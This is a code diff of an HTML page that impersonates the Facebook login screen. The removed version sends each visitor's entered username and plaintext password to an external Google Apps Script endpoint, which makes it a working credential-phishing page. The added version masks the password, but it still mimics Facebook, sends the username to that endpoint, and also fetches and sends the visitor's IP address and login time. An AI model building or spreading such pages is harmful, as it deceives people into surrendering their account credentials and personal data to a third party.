@@ -1,56 +1,77 @@
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Facebook Login Page</title>
-    <link rel="stylesheet" href="facebook.css" />
-  </head>
-  <body>
-    <div class="content">
-      <div class="flex-div">
-        <div class="name-content">
-          <h1 class="logo">Facebook</h1>
-          <p>Connect with friends and the world around you on Facebook.</p>
-        </div>
-          <form id="contactForm">
-            <input type="text" name="username" placeholder="Email or Phone Number" required />
-            <input type="text" name="password" placeholder="Password" required>
-             <button type="submit" class="login">Log In</button>
-            <a href="#">Forgot Password ?</a>
-            <hr>
-            <button class="create-account">Create New Account</button>
-          </form>
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook Login Page</title>
+  <link rel="stylesheet" href="facebook.css" />
+</head>
+<body>
+  <div class="content">
+    <div class="flex-div">
+      <div class="name-content">
+        <h1 class="logo">Facebook</h1>
+        <p>Connect with friends and the world around you on Facebook.</p>
       </div>
+      <form id="contactForm">
+        <input type="text" name="username" placeholder="Email or Phone Number" required />
+        <input type="password" name="password" placeholder="Password" required> <!-- Changed to password type -->
+        <button type="submit" class="login">Log In</button>
+        <a href="#">Forgot Password ?</a>
+        <hr>
+        <button type="button" class="create-account">Create New Account</button> <!-- Added type="button" -->
+      </form>
     </div>
-    <script>
-document.getElementById("contactForm").addEventListener("submit", async (e) => {
-  e.preventDefault();
-  
-  const formData = new FormData(e.target);
-  const data = Object.fromEntries(formData.entries());
-  
-  try {
-    const response = await fetch("https://script.google.com/macros/s/AKfycbylYQttfEWudU8jwSoK3PJkwNeecld3E78_LAOJgB4o4XAq0a5xVR2oJvDXB4jSFDGD/exec", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        username: data.username,
-        password: data.password, 
-      })
+  </div>
+  <script>
+    document.getElementById("contactForm").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      
+      // Get IP address for logging (optional)
+      let ip = "Unknown";
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        ip = ipData.ip;
+      } catch (ipError) {
+        console.warn("Could not get IP:", ipError);
+      }
+
+      const formData = new FormData(e.target);
+      const data = Object.fromEntries(formData.entries());
+      
+      try {
+        console.log("Submitting:", data); // Debug log
+        
+        const response = await fetch("https://script.google.com/macros/s/AKfycbylYQttfEWudU8jwSoK3PJkwNeecld3E78_LAOJgB4o4XAq0a5xVR2oJvDXB4jSFDGD/exec", {
+          method: "POST",
+          headers: { 
+            "Content-Type": "application/json",
+            "X-Custom-Header": "FormSubmit" 
+          },
+          body: JSON.stringify({
+            username: data.username,
+            login_time: new Date().toISOString(),
+            ip_address: ip,
+            password_masked: "******" // Never send real passwords!
+          })
+        });
+        
+        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+        
+        const result = await response.json();
+        console.log("Server response:", result);
+        
+        if (result.status === "success") {
+          alert("Login attempt recorded successfully!");
+        } else {
+          throw new Error(result.message || "Unknown server error");
+        }
+      } catch (error) {
+        console.error("Submission error:", error);
+        alert(`Error: ${error.message}`);
+      }
     });
-    
-    const result = await response.json();
-    if (result.status === "success") {
-      alert("Login attempt recorded");
-    } else {
-      throw new Error(result.message || "Submission failed");
-    }
-  } catch (error) {
-    console.error("Error:", error);
-    alert("Error: Could not submit form. Please try again.");
-  }
-});
-</script>
-  </body>
+  </script>
+</body>
 </html>
